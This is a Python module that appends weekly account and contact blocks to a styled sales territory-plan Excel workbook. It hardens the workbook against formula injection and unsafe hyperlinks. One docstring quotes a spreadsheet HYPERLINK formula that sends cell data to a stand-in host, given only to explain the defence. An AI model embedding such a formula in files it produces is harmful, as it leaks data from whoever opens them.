"""Territory plan workbook builder.

Maintains ONE styled .xlsx per rep and appends a new WEEK block beneath the previous
ones. It never creates a fresh file when one already exists, and never appends a week
label that is already present, so re-running the same Monday is a no-op rather than a
duplicate.

Contacts are written exactly as supplied. There is no placeholder padding: an account
with three real people gets three rows, because the skill's relevance floor means a
short list is a correct outcome rather than a gap to fill.

Email and phone are expected to be empty. They fill in only when the rep explicitly
reveals a contact.

    from pg_plan_builder import add_week

    appended = add_week(
        path="Territory_Plan_rep.xlsx",
        week_label="WEEK 2  (week of 2026-07-20)",
        accounts=[{"name": "Northwind", "contacts": [
            {"name": "Jane Doe", "title": "Director, Platform",
             "email": "", "phone": "",
             "linkedin": "https://linkedin.com/in/example-person-04",
             "notes": "Authored the account's why-now message, 12 Jul 2026",
             "warm": "Introduced by Jane Roe, shared 18 months at Continental Bank"}]}],
    )

Returns True when a block was appended, False when the week label was already there.
"""
from pathlib import Path

from openpyxl import Workbook, load_workbook
from openpyxl.styles import Alignment, Border, Font, PatternFill, Side
from openpyxl.utils import get_column_letter
from openpyxl.worksheet.datavalidation import DataValidation

COLUMNS = [
    "CONTACT:", "TITLE:", "EMAIL ADDRESS:", "PHONE NUMBER:", "LINKEDIN:",
    "Touchpoint 1", "Touchpoint 2", "Touchpoint 3", "Touchpoint 4", "Touchpoint 5",
    "Completed?", "Meeting Booked?", "Notes",
]
COLUMN_WIDTHS = [20, 28, 26, 18, 34, 17, 17, 17, 17, 17, 12, 15, 46]
NCOL = len(COLUMNS)

DEFAULT_BANNER = "TERRITORY PLAN"
DEFAULT_TOUCHPOINTS = [
    "Personalized Email", "Event Invite", "Partner Engagement",
    "Marketing Content", "Sequence Cadence",
]
SPARE_TOUCHPOINT_OPTIONS = ["LinkedIn Touch", "Phone Call", "Referral / Warm Intro", "n/a"]
DEFAULT_PALETTE = {"banner": "EFECE3", "week": "34D399", "account": "0B3B2E"}

LINKEDIN_COL = 5
TOUCHPOINT_FIRST_COL = 6
TOUCHPOINT_LAST_COL = 10
LEFT_ALIGNED = {2, 5, 13}
CENTER_ALIGNED = {6, 7, 8, 9, 10, 11, 12}

_SEPARATOR_FILL = PatternFill("solid", fgColor="ECECEC")
_HEADER_FONT = Font(name="Calibri", bold=True, underline="single", size=11, color="111111")
_CELL_FONT = Font(name="Calibri", size=11, color="222222")
_LINK_FONT = Font(name="Calibri", size=11, color="1155CC", underline="single")
_TBD_FONT = Font(name="Calibri", size=11, italic=True, color="888888")
_CENTER = Alignment(horizontal="center", vertical="center")
_LEFT = Alignment(horizontal="left", vertical="center", wrap_text=True)
_MIDDLE = Alignment(vertical="center")
_BOTTOM_BORDER = Border(bottom=Side(style="thin", color="D9D9D9"))


def _write_cell(sheet, row, col, value):
    """Write one externally-sourced value as inert text.

    openpyxl does not merely store a leading "=" -- it *types* the cell as a
    formula (data_type 'f'), so a prospect whose name arrives as
    `=HYPERLINK("http://x/?"&A1)` ships a working exfiltration link inside the
    rep's workbook. Everything in this sheet comes from a profile, a community
    message or a model draft, so nothing in it is trusted enough to be code.

    Forcing data_type to "s" is the fix, and it is sufficient: openpyxl then
    writes `t="inlineStr"`, which Excel renders as literal text -- a formula
    needs an `<f>` element it will no longer have. Deliberately *not* the
    apostrophe trick here. In xlsx the apostrophe has no special meaning at
    rest (it is Excel's input-time convention, replayed on read only via a
    quotePrefix style), so it would be stored as a visible character and every
    revealed phone number would render as `'+15551234567`. The CSV export has
    no type system and does need the apostrophe -- see csvCell in the template.
    """
    cell = sheet.cell(row, col, "" if value is None else str(value))
    cell.data_type = "s"
    return cell


def _safe_hyperlink(url):
    """Return an http(s) target for a LinkedIn cell, or None to leave it plain.

    A hyperlink is the one place a cell value becomes something the reader's
    machine acts on, so the scheme is checked rather than assumed. A bare
    `linkedin.com/in/example-person-04` is normal input and gets the prefix; anything carrying
    its own non-http scheme is not a profile URL and does not get to be a link.
    """
    target = (url or "").strip()
    if not target:
        return None
    lowered = target.lower()
    if lowered.startswith(("http://", "https://")):
        return target
    if ":" in target.split("/", 1)[0]:
        return None
    return f"https://{target}"


def _banner_font(palette):
    return Font(name="Calibri", bold=True, italic=True, size=14, color=palette["account"])


def _week_font():
    return Font(name="Calibri", bold=True, size=13, color="08302A")


def _account_font():
    return Font(name="Calibri", bold=True, size=12, color="FFFFFF")


def _open_or_create(path, banner, palette):
    """Open the rep's workbook, or start one.

    Appending to whatever already sits at `path` is the point -- one workbook per
    rep, a new WEEK block each Monday. It is also why a wrong path is quiet
    rather than loud: a typo'd or reused name grafts this rep's week onto an
    unrelated workbook and still returns True. Refuse anything that is not the
    .xlsx we expect to be extending, which is the cheapest way to turn that into
    an error at the call site instead of a support question later.
    """
    target = Path(path)
    if target.suffix.lower() != ".xlsx":
        raise ValueError(f"expected an .xlsx path, got {target.name!r}")
    if target.exists():
        if not target.is_file():
            raise ValueError(f"{target.name!r} is not a file")
        return load_workbook(target)

    workbook = Workbook()
    sheet = workbook.active
    sheet.title = "Territory Plan"
    for index, width in enumerate(COLUMN_WIDTHS, start=1):
        sheet.column_dimensions[get_column_letter(index)].width = width
    sheet.merge_cells(start_row=1, start_column=1, end_row=1, end_column=NCOL)
    cell = sheet.cell(1, 1, banner)
    cell.fill = PatternFill("solid", fgColor=palette["banner"])
    cell.font = _banner_font(palette)
    cell.alignment = _MIDDLE
    sheet.row_dimensions[1].height = 26
    return workbook


def _find_label_row(sheet, label):
    for row in range(1, sheet.max_row + 1):
        if sheet.cell(row, 1).value == label:
            return row
    return None


def _last_used_row(sheet):
    row = sheet.max_row
    while row > 1 and all(sheet.cell(row, col).value in (None, "") for col in range(1, NCOL + 1)):
        row -= 1
    return row


def _write_banner_row(sheet, row, text, fill_color, font):
    """Banner rows carry account names, which are external values like any other."""
    sheet.merge_cells(start_row=row, start_column=1, end_row=row, end_column=NCOL)
    cell = _write_cell(sheet, row, 1, text)
    cell.fill = PatternFill("solid", fgColor=fill_color)
    cell.font = font
    cell.alignment = Alignment(vertical="center", indent=1)


def _write_contact_row(sheet, row, contact, touchpoints, validation):
    linkedin = (contact.get("linkedin") or "").strip()
    notes = (contact.get("notes") or "").strip()
    warm = (contact.get("warm") or "").strip()
    if warm:
        notes = f"{notes}  ·  Warm intro: {warm}".strip(" ·")

    values = [
        contact.get("name", ""),
        contact.get("title", ""),
        contact.get("email") or "",
        contact.get("phone") or "",
        linkedin,
        *touchpoints[:5],
        "",
        "",
        notes,
    ]

    is_unfilled_seat = str(contact.get("name", "")).upper().startswith("TBD")
    link_target = _safe_hyperlink(linkedin)
    for col, value in enumerate(values, start=1):
        cell = _write_cell(sheet, row, col, value)
        if col == LINKEDIN_COL and link_target:
            cell.font = _LINK_FONT
            cell.hyperlink = link_target
        elif is_unfilled_seat and col <= 2:
            cell.font = _TBD_FONT
        else:
            cell.font = _CELL_FONT
        if col in LEFT_ALIGNED:
            cell.alignment = _LEFT
        elif col in CENTER_ALIGNED:
            cell.alignment = _CENTER
        else:
            cell.alignment = _MIDDLE
        cell.border = _BOTTOM_BORDER

    first = get_column_letter(TOUCHPOINT_FIRST_COL)
    last = get_column_letter(TOUCHPOINT_LAST_COL)
    validation.add(f"{first}{row}:{last}{row}")


def add_week(path, week_label, accounts, touchpoints=None, banner=None, palette=None):
    touchpoints = list(touchpoints or DEFAULT_TOUCHPOINTS)
    if len(touchpoints) != 5:
        raise ValueError(f"expected exactly 5 touchpoints, got {len(touchpoints)}")
    banner = banner or DEFAULT_BANNER
    palette = {**DEFAULT_PALETTE, **(palette or {})}

    workbook = _open_or_create(path, banner, palette)
    sheet = workbook.active

    if _find_label_row(sheet, week_label) is not None:
        return False

    row = max(_last_used_row(sheet), 1) + 2
    _write_banner_row(sheet, row, week_label, palette["week"], _week_font())
    sheet.row_dimensions[row].height = 22
    row += 1

    options = touchpoints + [option for option in SPARE_TOUCHPOINT_OPTIONS if option not in touchpoints]
    validation = DataValidation(
        type="list",
        formula1='"{}"'.format(",".join(options)),
        allow_blank=True,
    )
    sheet.add_data_validation(validation)

    for account in accounts:
        _write_banner_row(sheet, row, str(account["name"]).upper(), palette["account"], _account_font())
        sheet.row_dimensions[row].height = 20
        row += 1

        for col, heading in enumerate(COLUMNS, start=1):
            cell = sheet.cell(row, col, heading)
            cell.font = _HEADER_FONT
            cell.alignment = _CENTER
            cell.border = _BOTTOM_BORDER
        row += 1

        for contact in account.get("contacts") or []:
            _write_contact_row(sheet, row, contact, touchpoints, validation)
            row += 1

        sheet.merge_cells(start_row=row, start_column=1, end_row=row, end_column=NCOL)
        sheet.cell(row, 1, "").fill = _SEPARATOR_FILL
        sheet.row_dimensions[row].height = 8
        row += 1

    workbook.save(path)
    return True
